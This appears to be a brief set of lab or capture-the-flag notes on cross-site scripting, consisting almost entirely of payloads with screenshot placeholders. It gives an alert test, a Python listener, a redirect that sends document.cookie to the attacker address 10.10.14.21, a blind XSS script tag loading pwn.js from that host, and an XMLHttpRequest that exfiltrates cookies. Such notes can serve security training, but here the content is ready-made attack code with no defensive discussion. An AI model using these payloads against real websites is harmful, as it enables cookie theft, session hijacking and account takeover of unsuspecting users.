____

![Captura](../../../assets/images/reference/da725b66e2a6be75eca3.png)

```html
<script>alert("XSS")</script>
```

# XSS Cookie stealing

```html
<script>alert(document.cookie)</script>
```

```bash
python3 -m http.server 80
```

```html
<script>document.location="http://10.10.14.21/?cookie="+document.cookie</script>
```

![Captura](../../../assets/images/reference/9419226efc5a13176e07.png)

## Cookie Hijacking

![Captura](../../../assets/images/reference/a9934f952ffec55bd7de.png)

# Blind XSS Injection

```html
<script src="http://10.10.14.21/pwn.js"></script>
```

```js
var request = new XMLHttpRequest();
request.open('GET', 'http://10.10.14.21/?cookie=' + document.cookie, true);
request.send();
```
